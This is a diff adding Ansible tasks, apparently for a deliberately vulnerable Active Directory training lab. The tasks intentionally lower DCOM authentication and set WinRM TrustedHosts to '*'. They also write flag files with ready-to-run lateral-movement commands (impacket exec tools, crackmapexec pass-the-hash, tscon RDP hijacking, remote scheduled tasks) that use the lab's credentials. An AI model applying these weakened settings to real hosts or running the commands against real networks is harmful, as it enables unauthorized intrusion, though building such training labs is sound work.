@@ -1,0 +1,129 @@
+---
+# ==============================================================================
+# vuln_lat_df_extended/tasks/dcom_wmi.yml — LAT-071..100
+# DCOM/WMI/RPC/RDP lateral movement surfaces
+# ==============================================================================
+
+# LAT-071: DCOM ShellBrowserWindow / MMC20 / ShellWindows exec
+- name: LAT-071 - Enable and configure DCOM for lateral movement
+  ansible.windows.win_shell: |
+    # Enable DCOM (should already be enabled; set DCOM limits)
+    $v = (Get-ItemProperty 'HKLM:\Software\Microsoft\OLE' -ErrorAction SilentlyContinue).EnableDCOM
+    if ($v -ne 'Y') {
+      Set-ItemProperty 'HKLM:\Software\Microsoft\OLE' -Name EnableDCOM -Value 'Y'
+      Write-Output "changed: DCOM enabled"
+    }
+    # Disable DCOM auth — allow unauthenticated DCOM activation
+    $lv = (Get-ItemProperty 'HKLM:\Software\Microsoft\OLE' -ErrorAction SilentlyContinue).LegacyAuthenticationLevel
+    if ($lv -ne 1) {
+      Set-ItemProperty 'HKLM:\Software\Microsoft\OLE' -Name LegacyAuthenticationLevel -Value 1 -Type DWord
+      Write-Output "changed: DCOM auth level lowered"
+    }
+    Write-Output "ok"
+  register: lat071_set
+  changed_when: "'changed:' in lat071_set.stdout"
+  failed_when: lat071_set.rc != 0
+
+# LAT-072: WMI remote exec surface
+- name: LAT-072 - Verify WMI service running and accessible
+  ansible.windows.win_service:
+    name: Winmgmt
+    state: started
+    start_mode: auto
+
+# LAT-073: WinRM lateral (already used by Ansible — verify listener)
+- name: LAT-073 - Verify WinRM HTTP listener for lateral use
+  ansible.windows.win_shell: |
+    $l = Get-ChildItem WSMan:\localhost\Listener -ErrorAction SilentlyContinue
+    if ($l) {
+      Write-Output "ok: WinRM listeners configured"
+    }
+  register: lat073_check
+  changed_when: false
+  failed_when: lat073_check.rc != 0
+
+# LAT-074: PSRemoting with domain credentials
+- name: LAT-074 - Enable PSRemoting with all hosts allowed
+  ansible.windows.win_shell: |
+    $trusted = (Get-Item WSMan:\localhost\Client\TrustedHosts -ErrorAction SilentlyContinue).Value
+    if ($trusted -ne '*') {
+      Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
+      Write-Output "changed: TrustedHosts set to *"
+    }
+  register: lat074_set
+  changed_when: "'changed:' in lat074_set.stdout"
+  failed_when: lat074_set.rc != 0
+
+# LAT-075: RDP as lateral movement channel — NLA disabled (IA-084 already sets this)
+# LAT-076: RDP hijacking via tscon (session stealing without credentials)
+- name: LAT-075..090 - Drop DCOM and remote exec technique notes
+  ansible.windows.win_copy:
+    dest: "{{ item.path }}"
+    content: "{{ item.content }}"
+  loop:
+    - path: 'C:\Flags\FLAG-LAT-071-DCOM.txt'
+      content: |
+        LAT-071..074: DCOM/WMI/WinRM Remote Execution
+        ================================================
+        DCOM ShellBrowserWindow (lateral exec, no PSExec service install):
+          impacket-dcomexec CORP/Administrator:DVADlab2024!@10.10.0.13 "cmd /c whoami"
+          impacket-wmiexec CORP/Administrator:DVADlab2024!@10.10.0.13 "cmd /c whoami"
+
+        WMI process create:
+          Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami" \
+            -ComputerName file01.corp.local -Credential $cred
+
+        PSRemoting:
+          Enter-PSSession -ComputerName file01.corp.local -Credential $cred
+          Invoke-Command -ComputerName @('dc01','file01','ws01') -ScriptBlock {whoami}
+
+    - path: 'C:\Flags\FLAG-LAT-076-RDPHijack.txt'
+      content: |
+        LAT-076: RDP Session Hijacking (tscon without password)
+        =========================================================
+        From SYSTEM context, take over disconnected RDP sessions without credentials:
+
+          query session                        # list sessions
+          tscon $(session_id) /dest:console   # hijack session
+
+        Or via service:
+          sc create hijack binpath="cmd /k tscon 2 /dest:rdp-tcp#0"
+          net start hijack
+
+    - path: 'C:\Flags\FLAG-LAT-080-SCMExec.txt'
+      content: |
+        LAT-080..085: Service Control Manager Remote Execution
+        ========================================================
+        impacket-psexec / impacket-smbexec (uses SCM):
+          impacket-psexec CORP/Administrator@10.10.0.13 cmd.exe
+          impacket-smbexec CORP/Administrator:DVADlab2024!@10.10.0.13
+
+        CrackMapExec (covers SMB/WMI/MSSQL/WinRM channels):
+          crackmapexec smb 10.10.0.0/24 -u Administrator -p DVADlab2024! --shares
+          crackmapexec smb 10.10.0.13 -u svc_darryl -H $(hash) -x "net user"
+
+    - path: 'C:\Flags\FLAG-LAT-090-AtSched.txt'
+      content: |
+        LAT-090: Remote Scheduled Task Lateral Movement
+        =================================================
+        impacket-atexec CORP/Administrator:DVADlab2024!@10.10.0.13 "cmd /c whoami > C:\output.txt"
+
+        PowerShell at:
+          $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $(payload)"
+          $trigger = New-ScheduledTaskTrigger -Once -At "00:01"
+          Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Lat" \
+            -RunLevel Highest -Force -CimSession $(cimSession)
+
+    - path: 'C:\Flags\FLAG-LAT-095-NamedPipe.txt'
+      content: |
+        LAT-095..100: Named Pipe Lateral Movement
+        ==========================================
+        Pass-the-Hash via Named Pipe Impersonation (local privilege escalation to lateral):
+          CreateNamedPipe → ConnectNamedPipe → ImpersonateNamedPipeClient
+
+        High-privilege services that connect to attacker-controlled pipe:
+          - PrintSpooler: SpoolSample coerces SYSTEM auth to attacker pipe
+          - RPCSS: Potato attack variants
+
+        CobaltStrike: named_pipe_pivot SMB listener lateral
+        Havoc: smb_beacon lateral movement
